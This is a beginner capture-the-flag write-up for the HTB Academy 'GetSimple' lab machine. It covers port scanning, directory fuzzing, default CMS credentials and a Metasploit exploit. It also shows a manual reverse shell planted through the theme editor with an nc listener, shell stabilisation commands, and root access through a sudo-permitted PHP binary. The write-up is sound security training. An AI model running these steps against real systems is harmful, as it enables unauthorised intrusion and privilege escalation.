Tags: #metasploit #Unauthenticated_RCE #missconfiguration (escalada de privilegio) #GetSimpleCMS
___
# Get Simple

## General Information

<h3> Difficulty: <img src="https://img.shields.io/badge/Easy-green"> </h3>
<h3> SO: Linux</h3>
<h3> Exploited vulnerability:  Unauthenticated RCE, GetSimpleCMS, missconfiguration (escalada de privilegio)</h3>
<h3> Date: 19/02/2026</h3>
<h3> Link: <a href="https://academy.hackthebox.com/course/preview/getting-started">GetSimple - HTB academy</a> </a></h3>

### *Read this document* <a href="GetSimple.md">GetSimple</a>

## Reconocimiento

**HTB** provides us with the target machine's IP address, **10.129.12.175**. I will set the target VM's IP address in the **/etc/hosts** file and name it **gettingstarted.htb**.

### Ping

Depending on the result, we can deduce whether it is a Linux or Windows machine, for example:

```
ping -c 1 10.129.12.175
```

**Your ttl=63 is Linux**

### Open port scan

#### TCP port scan

The command I use with nmap is:

```
nmap -sV -sC -sS --open 10.129.12.175
```

<p align="center"> 
<img src="images/nmap.png" width="600" alt="Resultado de Nmap">
</p>

| Open port | Service | Version                                                      |
| --------- | ------- | ------------------------------------------------------------ |
| 22        | ssh     | OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) |
| 80        | http    | Apache httpd 2.4.41 ((Ubuntu))                               |

## Exploration

### Web Fuzzing

```
gobuster dir -u http://10.129.12.175/ -w /usr/share/dirb/wordlists/common.txt
```

<p align="center"> 
<img src="images/gpbuster.png" width="600" alt="Resultado de Nmap">
</p>

To view the index, we'll need to add the target machine's IP address to our `/etc/hosts` file. `robots.txt` redirects us to the `/admin` administration page.

While researching the default credentials for the `Getting Started` CSM, I found the following:

<p align="center"> 
<img src="images/Get Simple credentials default.png" width="600" alt="Resultado de Nmap">
</p>

## Exploitation

### Metasploit

To find out which version the CMS was running, look at the bottom of the page's index to see its version:

<p align="center"> 
<img src="images/version.png" width="600" alt="Resultado de Nmap">
</p>

In this session I start by searching for vulnerabilities using the **search GetSimple** command in Metasploit

<p align="center"> 
<img src="images/metasploit.png" width="600" alt="Resultado de Nmap">
</p>

I enter both the username and password to exploit this vulnerability

<p align="center"> 
<img src="images/Get Simple.png" width="600" alt="Resultado de Nmap">
</p>

Once inside, I go into the user's home folder to get the first flag.txt file.

### Sin Metasploit

On the home page, we go to **Theme - Edit Theme**. There we place the following code that we obtained [here](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) 

<p align="center"> 
<img src="images/exploit.png" width="600" alt="Resultado de Nmap">
</p>

The only thing we would need to change is the IP address of our Kali server and the port we want to access it through.

Then, we would activate the listening port on our Kali server using `nc -lvnp port number`.

Finally, to have a good connection, we would need to perform TTY processing.

#### TTY

If we want to do it with Python, we first need to know which binary is installed.

```
which python3
```

<p align="center"> 
<img src="images/python.png" width="600" alt="Resultado de Nmap">
</p>

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

**control z**

```
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

## Subsequent Exploitation

### Privilege Escalation with Metasploit

#### First Method:

```
sudo -l
```

<p align="center"> 
<img src="images/binario.png" width="600" alt="Resultado de Nmap">
</p>

To open a shell in Metasploit, we type the following:

```
shell
```

I realize that the binary **/usr/bin/php** has sudo permission, so I will run the following command to elevate my privileges. If you don't know PHP, you can find instructions on how to do it on this page [page](https://gtfobins.org/gtfobins/php/).

```
CMD="/bin/sh"
sudo /usr/bin/php -r "system('$CMD');"
```

We will gain root access, and thus obtain its flag.txt file.

## Conclusion

This "GetSimple" machine from HTB Academy's _Getting Started_ course is an ideal exercise for beginners: it allows you to see a complete and realistic pentesting flow, gaining initial access (with and without Metasploit) through a known vulnerability in GetSimpleCMS and culminating in a simple privilege escalation due to a misconfiguration of `sudo`.

Throughout the challenge, fundamental skills are reinforced, such as enumerating web services and routes, identifying the CMS version, and searching for applicable public exploits (for example, for GetSimple 3.3.15). It also highlights the importance of checking local permissions (`sudo -l`) to detect direct escalation vectors, such as executing `/usr/bin/php` with root privileges.